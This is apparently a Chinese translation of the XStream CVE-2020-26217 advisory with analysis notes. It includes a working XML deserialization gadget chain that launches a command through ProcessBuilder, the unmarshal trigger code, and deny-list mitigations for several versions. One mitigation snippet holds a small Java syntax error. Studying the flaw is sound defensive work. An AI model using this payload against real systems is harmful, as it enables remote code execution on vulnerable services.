# CVE-2020-26217

## 脆弱性

CVE-2020-26217: XStream 可以用于远程代码执行。

## 影响版本

如果使用开箱即用的版本，那么在 1.4.13 之前（包括 1.4.13）的所有版本都会受到影响。按照建议使用白名单设置 XStream 安全框架的用户不会受到影响。

## 描述

在解组时处理的流包含类型信息，以重新创建以前写入的对象。因此，XStream 根据这些类型信息创建新的实例。攻击者可以操作已处理的输入流并替换或注入对象，这些对象可以执行任意 shell 命令。

此问题是 CVE-2013-7285 的变体，这次使用了 Java 运行时环境的不同类集，这些类都不是 XStream 默认黑名单的一部分。同样的问题已经在 CVE-2017-9805 中被报道为 struts 的 XStream 插件，但是 XStream 项目从未被告知。

## 重现步骤

创建一个简单的 HashMap，并使用 XStream 将其编组为 XML。用以下代码片段替换 XML，并再次用 XStream 反编组它:

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
        <dataHandler>
          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
            <contentType>text/plain</contentType>
            <is class='java.io.SequenceInputStream'>
              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                <iterator class='javax.imageio.spi.FilterIterator'>
                  <iter class='java.util.ArrayList$Itr'>
                    <cursor>0</cursor>
                    <lastRet>-1</lastRet>
                    <expectedModCount>1</expectedModCount>
                    <outer-class>
                      <java.lang.ProcessBuilder>
                        <command>
                          <string>calc</string>
                        </command>
                      </java.lang.ProcessBuilder>
                    </outer-class>
                  </iter>
                  <filter class='javax.imageio.ImageIO$ContainsFilter'>
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>start</name>
                  </filter>
                  <next/>
                </iterator>
                <type>KEYS</type>
              </e>
              <in class='java.io.ByteArrayInputStream'>
                <buf></buf>
                <pos>0</pos>
                <mark>0</mark>
                <count>0</count>
              </in>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>test</string>
  </entry>
</map>
```

```java
XStream xstream = new XStream();
xstream.fromXML(xml);
```

一旦 XML 被反编组，有效负载就会被执行。

在一个类似但更简单的场景中，将 `javax.imageio.ImageIO.ContainsFilter` 注入到 `java.util.Iterator` 实例中，并在调用迭代器的下一个方法时立即执行有效负载。

注意，本例使用 XML，但攻击可以针对任何支持的格式执行。例如 JSON。

## 影响

该漏洞可能允许远程攻击者仅通过操纵已处理的输入流来运行任意 shell 命令。

## 解决方案

按照建议，使用 XStream 的安全框架为允许的类型实现一个白名单。

XStream 1.4.13 的用户如果想使用 XStream 默认黑名单，只需在 XStream 的设置代码中添加两行:

```java
xstream.denyTypes(new String[]{ "javax.imageio.ImageIO$ContainsFilter" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });
```

XStream 1.4.12 到 1.4.7 的用户如果想使用带有黑名单的 XStream，必须从头开始设置这样一个列表，并至少拒绝以下类型: `javax.imageio.ImageIO$ContainsFilter`，`java.beans.EventHandler`，`java.lang.ProcessBuilder`，`java.lang.Void`和 `void`。

```java
xstream.denyTypes(new String[]{ "javax.imageio.ImageIO$ContainsFilter" });
xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class, java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class });
```

XStream 1.4.6 或更低版本的用户可以注册自己的转换器，以防止对当前已知的关键 Java 运行时类型进行解组。它实际上是 CVE-2013-7285 解决方案的更新版本:

```java
xstream.registerConverter(new Converter() {
  public boolean canConvert(Class type) {
    return type != null && (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class || type == java.lang.Void.class || void.class || type.getName().equals("javax.imageio.ImageIO$ContainsFilter") || Proxy.isProxy(type));
  }

  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    throw new ConversionException("Unsupported type due to security reasons.");
  }

  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
    throw new ConversionException("Unsupported type due to security reasons.");
  }
}, XStream.PRIORITY_VERY_HIGH);
```

## 调用堆栈

从 poc 中可以看出，最后一步会运行到 `java.lang.ProcessBuilder#start` 方法，所以直接在这里下断点


